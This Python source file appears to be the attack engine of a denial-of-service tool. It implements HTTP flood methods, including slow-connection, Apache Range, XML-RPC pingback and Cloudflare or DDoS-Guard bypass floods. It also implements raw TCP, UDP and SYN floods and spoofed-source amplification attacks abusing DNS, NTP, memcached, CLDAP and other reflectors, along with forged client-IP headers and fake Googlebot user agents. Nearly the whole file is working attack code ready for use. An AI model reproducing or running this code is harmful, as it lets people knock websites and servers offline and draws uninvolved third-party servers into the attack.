import logging
from contextlib import suppress
from itertools import cycle
from math import log2, trunc
from os import urandom as randbytes
from pathlib import Path
from random import choice
from secrets import choice as randchoice
from socket import (
    AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM,
    SOCK_RAW, SOCK_STREAM, TCP_NODELAY, socket
)
from ssl import CERT_NONE, SSLContext, create_default_context
from subprocess import run, PIPE
from sys import exit as _exit
from threading import Event
from time import sleep, time
from typing import Any, List, Optional, Set, Tuple
from urllib import parse

from cloudscraper import create_scraper
from requests import Response, Session, get, cookies
from yarl import URL

from PyRoxy import Proxy, ProxyType, Tools as ProxyTools
from .ImpactPacket import IP, TCP, UDP, Data
from .core import cl, logger, ROOT_DIR, Stats

from .referers import REFERERS
from .useragents import USERAGENTS
from .rotate import suffix as rotate_suffix, params as rotate_params


USERAGENTS = list(USERAGENTS)
REFERERS = list(set(a.strip() for a in REFERERS))

ctx: SSLContext = create_default_context()
ctx.check_hostname = False
ctx.verify_mode = CERT_NONE
ctx.set_ciphers("DEFAULT")

SOCK_TIMEOUT = 8

__ip__: Optional[str] = None


def getMyIPAddress():
    global __ip__
    if __ip__:
        return __ip__
    with suppress(Exception):
        __ip__ = get('https://api.my-ip.io/ip', timeout=.1).text
    with suppress(Exception):
        __ip__ = get('https://ipwhois.app/json/', timeout=.1).json()["ip"]
    with suppress(Exception):
        __ip__ = get('https://ipinfo.io/json', timeout=.1).json()["ip"]
    with suppress(Exception):
        __ip__ = ProxyTools.Patterns.IP.search(get('http://checkip.dyndns.org/', timeout=.1).text)
    with suppress(Exception):
        __ip__ = ProxyTools.Patterns.IP.search(get('https://spaceiran.com/myip/', timeout=.1).text)
    with suppress(Exception):
        __ip__ = get('https://ip.42.pl/raw', timeout=.1).text
    return getMyIPAddress()


def exit(*message):
    if message:
        logger.error(cl.RED + " ".join(message) + cl.RESET)
    logging.shutdown()
    _exit(1)


class Methods:
    LAYER7_METHODS: Set[str] = {
        "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
        "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
        "APACHE", "XMLRPC", "BOT", "DOWNLOADER",
    }

    LAYER4_METHODS: Set[str] = {
        "TCP", "UDP", "SYN", "VSE", "MEM", "NTP", "DNS", "ARD",
        "CHAR", "RDP", "CPS", "FIVEM", "TS3", "MCPE",
        "CLDAP"
    }
    ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}


google_agents = [
    "Mozila/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, "
    "like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; "
    "+http://www.google.com/bot.html)) "
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Googlebot/2.1 (+http://www.googlebot.com/bot.html)"
]


class Tools:
    @staticmethod
    def humanbits(i: int) -> str:
        MULTIPLES = ["Bit", "kBit", "MBit", "GBit"]
        if i > 0:
            base = 1024
            multiple = trunc(log2(i) / log2(base))
            value = i / pow(base, multiple)
            return f'{value:.2f} {MULTIPLES[multiple]}'
        else:
            return '0 Bit'

    @staticmethod
    def humanformat(num: int, precision: int = 2) -> str:
        suffixes = ['', 'k', 'm', 'g', 't', 'p']
        if num > 999:
            obje = sum(abs(num / 1000.0 ** x) >= 1 for x in range(1, len(suffixes)))
            return f'{num / 1000.0 ** obje:.{precision}f}{suffixes[obje]}'
        else:
            return str(num)

    @staticmethod
    def sizeOfRequest(res: Response) -> int:
        size: int = len(res.request.method)
        size += len(res.request.url)
        size += len('\r\n'.join(f'{key}: {value}'
                                for key, value in res.request.headers.items()))
        return size

    @staticmethod
    def randchr(lengh: int) -> str:
        return str(ProxyTools.Random.rand_str(lengh)).strip()

    @staticmethod
    def parse_params(url, ip, proxies):
        result = url.host.lower().endswith(rotate_suffix)
        if result: return choice(rotate_params), []
        return (url, ip), proxies

    @staticmethod
    def send(sock: socket, packet: bytes, stats: Stats):
        if not sock.send(packet):
            return False
        stats.track(1, len(packet))
        return True

    @staticmethod
    def sendto(sock, packet, target, stats: Stats):
        if not sock.sendto(packet, target):
            return False
        stats.track(1, len(packet))
        return True

    @staticmethod
    def dgb_solver(url, ua, pro=None):
        idss = None
        with Session() as s:
            if pro:
                s.proxies = pro
            hdrs = {
                "User-Agent": ua,
                "Accept": "text/html",
                "Accept-Language": "en-US",
                "Connection": "keep-alive",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "TE": "trailers",
                "DNT": "1"
            }
            with s.get(url, headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    s.cookies.set_cookie(cookies.create_cookie(key, value))
            hdrs = {
                "User-Agent": ua,
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Referer": url,
                "Sec-Fetch-Dest": "script",
                "Sec-Fetch-Mode": "no-cors",
                "Sec-Fetch-Site": "cross-site"
            }
            with s.post("https://check.ddos-guard.net/check.js", headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    if key == '__ddg2':
                        idss = value
                    s.cookies.set_cookie(cookies.create_cookie(key, value))

            hdrs = {
                "User-Agent": ua,
                "Accept": "image/webp,*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Cache-Control": "no-cache",
                "Referer": url,
                "Sec-Fetch-Dest": "script",
                "Sec-Fetch-Mode": "no-cors",
                "Sec-Fetch-Site": "cross-site"
            }
            with s.get(f"{url}.well-known/ddos-guard/id/{idss}", headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    s.cookies.set_cookie(cookies.create_cookie(key, value))
                return s

    @staticmethod
    def safe_close(sock=None):
        if sock:
            sock.close()


# noinspection PyBroadException,PyUnusedLocal
class Layer4:
    _method: str
    _target: Tuple[str, int]
    _ref: Any
    SENT_FLOOD: Any
    _amp_payloads = cycle
    _proxies: List[Proxy] = None

    def __init__(
        self,
        target: Tuple[str, int],
        ref: List[str],
        method: str,
        event: Event,
        proxies: List[Proxy],
        stats: Stats,
    ):
        self._amp_payload = None
        self._amp_payloads = cycle([])
        self._ref = ref
        self._method = method
        self._target = target
        self._event = event
        self._stats = stats
        if proxies:
            self._proxies = proxies
        self.select(self._method)

    def run(self) -> int:
        return self.SENT_FLOOD()

    def open_connection(self,
                        conn_type=AF_INET,
                        sock_type=SOCK_STREAM,
                        proto_type=IPPROTO_TCP):
        if self._proxies:
            s = randchoice(self._proxies).open_socket(
                conn_type, sock_type, proto_type)
        else:
            s = socket(conn_type, sock_type, proto_type)
        s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        s.settimeout(SOCK_TIMEOUT)
        s.connect(self._target)
        return s

    def select(self, name):
        self.SENT_FLOOD = self.TCP
        if name == "UDP": self.SENT_FLOOD = self.UDP
        if name == "SYN": self.SENT_FLOOD = self.SYN
        if name == "VSE": self.SENT_FLOOD = self.VSE
        if name == "TS3": self.SENT_FLOOD = self.TS3
        if name == "MCPE": self.SENT_FLOOD = self.MCPE
        if name == "FIVEM": self.SENT_FLOOD = self.FIVEM
        if name == "CPS": self.SENT_FLOOD = self.CPS
        if name == "RDP":
            self._amp_payload = (
                b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00',
                3389
            )
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "CLDAP":
            self._amp_payload = (
                b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00'
                b'\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00',
                389
            )
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "MEM":
            self._amp_payload = (
                b'\x00\x01\x00\x00\x00\x01\x00\x00gets p h e\n', 11211)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "CHAR":
            self._amp_payload = (b'\x01', 19)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "ARD":
            self._amp_payload = (b'\x00\x14\x00\x00', 3283)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "NTP":
            self._amp_payload = (b'\x17\x00\x03\x2a\x00\x00\x00\x00', 123)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "DNS":
            self._amp_payload = (
                b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00'
                b'\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00',
                53)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())

    def TCP(self) -> int:
        s, packets = None, 0
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while self._event.is_set() and Tools.send(s, randbytes(1024), self._stats):
                packets += 1
        Tools.safe_close(s)
        return packets

    def CPS(self) -> int:
        s, packets = None, 0
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            self._stats.track(1, 0)
            packets += 1
        Tools.safe_close(s)
        return packets

    def UDP(self) -> int:
        s, packets = None, 0
        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
            while self._event.is_set() and Tools.sendto(s, randbytes(1024), self._target, self._stats):
                packets += 1
        Tools.safe_close(s)
        return packets

    def SYN(self) -> int:
        payload = self._generate_syn()
        s, packets = None, 0
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while Tools.sendto(s, payload, self._target, self._stats):
                packets += 1
        Tools.safe_close(s)
        return packets

    def AMP(self) -> int:
        s, packets = None, 0
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while Tools.sendto(s, *next(self._amp_payloads), self._target, self._stats):
                packets += 1
        Tools.safe_close(s)
        return packets

    def VSE(self) -> int:
        payload = (b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
                   b'\x20\x51\x75\x65\x72\x79\x00')
        s, packets = None, 0
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target, self._stats):
                packets += 1
        Tools.safe_close(s)
        return packets

    def FIVEM(self) -> int:
        payload = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
        s, packets = None, 0
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target, self._stats):
                packets += 1
        Tools.safe_close(s)
        return packets

    def TS3(self) -> int:
        payload = b'\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02'
        s, packets = None, 0
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target, self._stats):
                packets += 1
        Tools.safe_close(s)
        return packets

    def MCPE(self) -> int:
        payload = (b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f'
                   b'\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20'
                   b'\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c'
                   b'\x73')
        s, packets = None, 0
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target, self._stats):
                packets += 1
        Tools.safe_close(s)
        return packets

    def _generate_syn(self) -> bytes:
        ip: IP = IP()
        ip.set_ip_src(getMyIPAddress())
        ip.set_ip_dst(self._target[0])
        tcp: TCP = TCP()
        tcp.set_SYN()
        tcp.set_th_dport(self._target[1])
        tcp.set_th_sport(ProxyTools.Random.rand_int(1, 65535))
        ip.contains(tcp)
        return ip.get_packet()

    def _generate_amp(self):
        payloads = []
        for ref in self._ref:
            ip: IP = IP()
            ip.set_ip_src(self._target[0])
            ip.set_ip_dst(ref)

            ud: UDP = UDP()
            ud.set_uh_dport(self._amp_payload[1])
            ud.set_uh_sport(self._target[1])

            ud.contains(Data(self._amp_payload[0]))
            ip.contains(ud)

            payloads.append((ip.get_packet(), (ref, self._amp_payload[1])))
        return payloads


class HttpFlood:
    _proxies: List[Proxy] = None
    _payload: str
    _defaultpayload: Any
    _req_type: str
    _useragents: List[str]
    _referers: List[str]
    _target: URL
    _method: str
    _rpc: int
    _event: Any
    SENT_FLOOD: Any

    def __init__(
        self,
        target: URL,
        host: str,
        method: str,
        rpc: int,
        event: Event,
        useragents: List[str],
        referers: List[str],
        proxies: List[Proxy],
        stats: Stats
    ) -> None:
        self.SENT_FLOOD = None
        self._event = event
        self._rpc = rpc
        self._method = method
        self._target = target
        self._host = host
        self._raw_target = (self._host, (self._target.port or 80))
        self._stats = stats

        if not self._target.host[len(self._target.host) - 1].isdigit():
            self._raw_target = (self._host, (self._target.port or 80))

        self._referers = referers
        self._useragents = useragents
        if proxies:
            self._proxies = proxies
        self._req_type = self.getMethodType(method)
        self._defaultpayload = "%s %s HTTP/%s\r\n" % (self._req_type,
                                                      target.raw_path_qs, randchoice(['1.1', '1.2']))
        self._payload = (self._defaultpayload +
                         'Accept-Encoding: gzip, deflate, br\r\n'
                         'Accept-Language: en-US,en;q=0.9\r\n'
                         'Cache-Control: max-age=0\r\n'
                         'Connection: Keep-Alive\r\n'
                         'Sec-Fetch-Dest: document\r\n'
                         'Sec-Fetch-Mode: navigate\r\n'
                         'Sec-Fetch-Site: none\r\n'
                         'Sec-Fetch-User: ?1\r\n'
                         'Sec-Gpc: 1\r\n'
                         'Pragma: no-cache\r\n'
                         'Upgrade-Insecure-Requests: 1\r\n')
        self.select(self._method)

    def run(self) -> int:
        return self.SENT_FLOOD()

    @property
    def SpoofIP(self) -> str:
        spoof: str = ProxyTools.Random.rand_ipv4()
        return ("X-Forwarded-Proto: Http\r\n"
                f"X-Forwarded-Host: {self._target.raw_host}, 1.1.1.1\r\n"
                f"Via: {spoof}\r\n"
                f"Client-IP: {spoof}\r\n"
                f'X-Forwarded-For: {spoof}\r\n'
                f'Real-IP: {spoof}\r\n')

    def generate_payload(self, other: str = None) -> bytes:
        return str.encode((self._payload +
                           "Host: %s\r\n" % self._target.authority +
                           self.randHeadercontent +
                           (other if other else "") +
                           "\r\n"))

    def open_connection(self) -> socket:
        if self._proxies:
            sock = randchoice(self._proxies).open_socket(AF_INET, SOCK_STREAM)
        else:
            sock = socket(AF_INET, SOCK_STREAM)

        sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        sock.settimeout(SOCK_TIMEOUT)
        sock.connect(self._raw_target)

        if self._target.scheme.lower() == "https" or self._target.port == 443:
            sock = ctx.wrap_socket(sock,
                                   server_hostname=self._target.host,
                                   server_side=False,
                                   do_handshake_on_connect=True,
                                   suppress_ragged_eofs=True)
        return sock

    @property
    def randHeadercontent(self) -> str:
        return (f"User-Agent: {randchoice(self._useragents)}\r\n"
                f"Referrer: {randchoice(self._referers)}{parse.quote(self._target.human_repr())}\r\n" +
                self.SpoofIP)

    @staticmethod
    def getMethodType(method: str) -> str:
        return "GET" if {method.upper()} & {"CFB", "CFBUAM", "GET", "COOKIE", "OVH", "EVEN",
                                            "DYN", "SLOW", "PPS", "APACHE",
                                            "BOT", } \
            else "POST" if {method.upper()} & {"POST", "XMLRPC", "STRESS"} \
            else "HEAD" if {method.upper()} & {"GSB", "HEAD"} \
            else "REQUESTS"

    def POST(self) -> int:
        payload: bytes = self.generate_payload(
            ("Content-Length: 44\r\n"
             "X-Requested-With: XMLHttpRequest\r\n"
             "Content-Type: application/json\r\n\r\n"
             '{"data": %s}') % ProxyTools.Random.rand_str(32))[:-2]
        s, packets = None, 0
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                if not self._event.is_set(): return 0
                Tools.send(s, payload, self._stats)
                packets += 1
        Tools.safe_close(s)
        return packets

    def STRESS(self) -> int:
        payload: bytes = self.generate_payload(
            (f"Content-Length: 524\r\n"
             "X-Requested-With: XMLHttpRequest\r\n"
             "Content-Type: application/json\r\n\r\n"
             '{"data": %s}') % ProxyTools.Random.rand_str(512))[:-2]
        s, packets = None, 0
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                if not self._event.is_set(): return 0
                Tools.send(s, payload, self._stats)
                packets += 1
        Tools.safe_close(s)
        return packets

    def COOKIES(self) -> int:
        payload: bytes = self.generate_payload(
            "Cookie: _ga=GA%s;"
            " _gat=1;"
            " __cfduid=dc232334gwdsd23434542342342342475611928;"
            " %s=%s\r\n" %
            (ProxyTools.Random.rand_int(1000, 99999), ProxyTools.Random.rand_str(6),
             ProxyTools.Random.rand_str(32))
        )
        s, packets = None, 0
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                if not self._event.is_set(): return 0
                Tools.send(s, payload, self._stats)
                packets += 1
        Tools.safe_close(s)
        return packets

    def APACHE(self) -> int:
        payload: bytes = self.generate_payload("Range: bytes=0-,%s" % ",".join("5-%d" % i for i in range(1, 1024)))
        s, packets = None, 0
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                if not self._event.is_set(): return 0
                Tools.send(s, payload, self._stats)
                packets += 1
        Tools.safe_close(s)
        return packets

    def XMLRPC(self) -> int:
        payload: bytes = self.generate_payload(
            ("Content-Length: 345\r\n"
             "X-Requested-With: XMLHttpRequest\r\n"
             "Content-Type: application/xml\r\n\r\n"
             "<?xml version='1.0' encoding='iso-8859-1'?>"
             "<methodCall><methodName>pingback.ping</methodName>"
             "<params><param><value><string>%s</string></value>"
             "</param><param><value><string>%s</string>"
             "</value></param></params></methodCall>") %
            (ProxyTools.Random.rand_str(64),
             ProxyTools.Random.rand_str(64)))[:-2]
        s, packets = None, 0
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                if not self._event.is_set(): return 0
                Tools.send(s, payload, self._stats)
                packets += 1
        Tools.safe_close(s)
        return packets

    def PPS(self) -> int:
        s, packets = None, 0
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                if not self._event.is_set(): return 0
                Tools.send(s, self._defaultpayload, self._stats)
                packets += 1
        Tools.safe_close(s)
        return packets

    def GET(self) -> int:
        payload: bytes = self.generate_payload()
        s, packets = None, 0
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                if not self._event.is_set(): return 0
                Tools.send(s, payload, self._stats)
                packets += 1
        Tools.safe_close(s)
        return packets

    def BOT(self) -> int:
        payload: bytes = self.generate_payload()
        p1, p2 = str.encode(
            "GET /robots.txt HTTP/1.1\r\n"
            "Host: %s\r\n" % self._target.raw_authority +
            "Connection: Keep-Alive\r\n"
            "Accept: text/plain,text/html,*/*\r\n"
            "User-Agent: %s\r\n" % randchoice(google_agents) +
            "Accept-Encoding: gzip,deflate,br\r\n\r\n"), str.encode(
            "GET /sitemap.xml HTTP/1.1\r\n"
            "Host: %s\r\n" % self._target.raw_authority +
            "Connection: Keep-Alive\r\n"
            "Accept: */*\r\n"
            "From: googlebot(at)googlebot.com\r\n"
            "User-Agent: %s\r\n" % randchoice(google_agents) +
            "Accept-Encoding: gzip,deflate,br\r\n"
            "If-None-Match: %s-%s\r\n" % (ProxyTools.Random.rand_str(9),
                                          ProxyTools.Random.rand_str(4)) +
            "If-Modified-Since: Sun, 26 Set 2099 06:00:00 GMT\r\n\r\n")
        s, packets = None, 0
        with suppress(Exception), self.open_connection() as s:
            Tools.send(s, p1, self._stats)
            packets += 1
            Tools.send(s, p2, self._stats)
            packets += 1
            for _ in range(self._rpc):
                if not self._event.is_set(): return 0
                Tools.send(s, payload, self._stats)
                packets += 1
        Tools.safe_close(s)
        return packets

    def EVEN(self) -> int:
        payload: bytes = self.generate_payload()
        s, packets = None, 0
        with suppress(Exception), self.open_connection() as s:
            while self._event.is_set() and Tools.send(s, payload, self._stats) and s.recv(1):
                packets += 1
        Tools.safe_close(s)
        return packets

    def OVH(self) -> int:
        payload: bytes = self.generate_payload()
        s, packets = None, 0
        with suppress(Exception), self.open_connection() as s:
            for _ in range(min(self._rpc, 5)):
                if not self._event.is_set(): return 0
                Tools.send(s, payload, self._stats)
                packets += 1
        Tools.safe_close(s)
        return packets

    def CFB(self) -> int:
        proxies = None
        if self._proxies:
            proxies = randchoice(self._proxies).asRequest()
        s, packets = None, 0
        with suppress(Exception), create_scraper() as s:
            for _ in range(self._rpc):
                if not self._event.is_set(): return 0
                with s.get(self._target.human_repr(), proxies=proxies) as res:
                    self._stats.track(1, Tools.sizeOfRequest(res))
                    packets += 1
        Tools.safe_close(s)

    def CFBUAM(self) -> int:
        payload: bytes = self.generate_payload()
        s, packets = None, 0
        with suppress(Exception), self.open_connection() as s:
            Tools.send(s, payload, self._stats)
            packets += 1
            sleep(5.01)
            ts = time()
            for _ in range(self._rpc):
                if not self._event.is_set(): return 0
                Tools.send(s, payload, self._stats)
                packets += 1
                if time() > ts + 120: break
        Tools.safe_close(s)
        return packets

    def AVB(self) -> int:
        payload: bytes = self.generate_payload()
        s, packets = None, 0
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                if not self._event.is_set(): return 0
                sleep(max(self._rpc / 1000, 1))
                Tools.send(s, payload, self._stats)
                packets += 1
        Tools.safe_close(s)
        return packets

    def DGB(self) -> int:
        proxies = None
        if self._proxies:
            pro = randchoice(self._proxies)
            proxies = pro.asRequest()

        ua = randchoice(self._useragents)
        s, packets = None, 0
        with suppress(Exception), Tools.dgb_solver(self._target.human_repr(), ua, proxies) as s:
            for _ in range(min(self._rpc, 5)):
                if not self._event.is_set(): return 0
                sleep(min(self._rpc, 5) / 100)
                with s.get(self._target.human_repr(), proxies=proxies) as res:
                    if b'<title>DDOS-GUARD</title>' in res.content[:100]:
                        break
                    self._stats.track(1, Tools.sizeOfRequest(res))
                    packets += 1
        Tools.safe_close(s)
        return packets

    def DYN(self) -> int:
        payload: bytes = str.encode(
            self._payload +
            "Host: %s.%s\r\n" % (ProxyTools.Random.rand_str(6), self._target.authority) +
            self.randHeadercontent +
            "\r\n"
        )
        s, packets = None, 0
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                if not self._event.is_set(): return 0
                Tools.send(s, payload, self._stats)
                packets += 1
        Tools.safe_close(s)
        return packets

    def DOWNLOADER(self) -> int:
        payload: bytes = self.generate_payload()

        s, packets = None, 0
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                if not self._event.is_set(): return 0
                Tools.send(s, payload, self._stats)
                packets += 1
                while 1:
                    sleep(.01)
                    data = s.recv(1)
                    if not data:
                        break
            Tools.send(s, b'0', self._stats)
            packets += 1
        Tools.safe_close(s)
        return packets

    def BYPASS(self) -> int:
        pro = None
        if self._proxies:
            pro = randchoice(self._proxies)
        s, packets = None, 0
        with suppress(Exception), Session() as s:
            for _ in range(self._rpc):
                if not self._event.is_set(): return 0
                if pro:
                    with s.get(self._target.human_repr(),
                               proxies=pro.asRequest()) as res:
                        self._stats.track(1, Tools.sizeOfRequest(res))
                        packets += 1
                        continue

                with s.get(self._target.human_repr()) as res:
                    self._stats.track(1, Tools.sizeOfRequest(res))
                    packets += 1
        Tools.safe_close(s)
        return packets

    def GSB(self) -> int:
        payload = str.encode(
            "%s %s?qs=%s HTTP/1.1\r\n" % (self._req_type,
                                          self._target.raw_path_qs,
                                          ProxyTools.Random.rand_str(6)) +
            "Host: %s\r\n" % self._target.authority +
            self.randHeadercontent +
            'Accept-Encoding: gzip, deflate, br\r\n'
            'Accept-Language: en-US,en;q=0.9\r\n'
            'Cache-Control: max-age=0\r\n'
            'Connection: Keep-Alive\r\n'
            'Sec-Fetch-Dest: document\r\n'
            'Sec-Fetch-Mode: navigate\r\n'
            'Sec-Fetch-Site: none\r\n'
            'Sec-Fetch-User: ?1\r\n'
            'Sec-Gpc: 1\r\n'
            'Pragma: no-cache\r\n'
            'Upgrade-Insecure-Requests: 1\r\n\r\n'
        )
        s, packets = None, 0
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                if not self._event.is_set(): return 0
                Tools.send(s, payload, self._stats)
                packets += 1
        Tools.safe_close(s)
        return packets

    def NULL(self) -> int:
        payload: bytes = str.encode(
            self._payload +
            "Host: %s\r\n" % self._target.authority +
            "User-Agent: null\r\n" +
            "Referrer: null\r\n" +
            self.SpoofIP + "\r\n"
        )
        s, packets = None, 0
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                if not self._event.is_set(): return 0
                Tools.send(s, payload, self._stats)
                packets += 1
        Tools.safe_close(s)
        return packets

    def SLOW(self) -> int:
        payload: bytes = self.generate_payload()
        s, packets = None, 0
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                if not self._event.is_set(): return 0
                Tools.send(s, payload, self._stats)
                packets += 1
            while Tools.send(s, payload, self._stats) and s.recv(1):
                for i in range(self._rpc):
                    if not self._event.is_set(): return 0
                    keep = str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000))
                    Tools.send(s, keep, self._stats)
                    packets += 1
                    sleep(self._rpc / 15)
                    break
        Tools.safe_close(s)
        return packets

    def select(self, name: str) -> None:
        self.SENT_FLOOD = self.GET
        if name == "POST":
            self.SENT_FLOOD = self.POST
        if name == "CFB":
            self.SENT_FLOOD = self.CFB
        if name == "CFBUAM":
            self.SENT_FLOOD = self.CFBUAM
        if name == "XMLRPC":
            self.SENT_FLOOD = self.XMLRPC
        if name == "BOT":
            self.SENT_FLOOD = self.BOT
        if name == "APACHE":
            self.SENT_FLOOD = self.APACHE
        if name == "BYPASS":
            self.SENT_FLOOD = self.BYPASS
        if name == "DGB":
            self.SENT_FLOOD = self.DGB
        if name == "OVH":
            self.SENT_FLOOD = self.OVH
        if name == "AVB":
            self.SENT_FLOOD = self.AVB
        if name == "STRESS":
            self.SENT_FLOOD = self.STRESS
        if name == "DYN":
            self.SENT_FLOOD = self.DYN
        if name == "SLOW":
            self.SENT_FLOOD = self.SLOW
        if name == "GSB":
            self.SENT_FLOOD = self.GSB
        if name == "NULL":
            self.SENT_FLOOD = self.NULL
        if name == "COOKIE":
            self.SENT_FLOOD = self.COOKIES
        if name == "PPS":
            self.SENT_FLOOD = self.PPS
            self._defaultpayload = (
                self._defaultpayload +
                "Host: %s\r\n\r\n" % self._target.authority
            ).encode()
        if name == "EVEN": self.SENT_FLOOD = self.EVEN
        if name == "DOWNLOADER": self.SENT_FLOOD = self.DOWNLOADER


def main(url, ip, method, event, proxies, stats, rpc=None, refl_li_fn=None):
    if method not in Methods.ALL_METHODS:
        exit(f"Method {method} Not Found")

    (url, ip), proxies = Tools.parse_params(url, ip, proxies)
    if method in Methods.LAYER7_METHODS:
        return HttpFlood(url, ip, method, rpc, event, USERAGENTS, REFERERS, proxies, stats)

    if method in Methods.LAYER4_METHODS:
        port = url.port

        if port > 65535 or port < 1:
            exit("Invalid Port [Min: 1 / Max: 65535] ")

        if not port:
            logger.warning("Port Not Selected, Set To Default: 80")
            port = 80

        ref = None
        if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD"}:
            # TODO: rework this code when amplifier attack is planned
            # (not used as of now)
            refl_li = ROOT_DIR / "files" / refl_li_fn
            if not refl_li.exists():
                exit("The reflector file doesn't exist")
            with refl_li.open("r+") as f:
                ref = set(
                    a.strip()
                    for a in ProxyTools.Patterns.IP.findall(f.read())
                )
            if not ref:
                exit("Empty Reflector File ")

        return Layer4((ip, port), ref, method, event, proxies, stats)
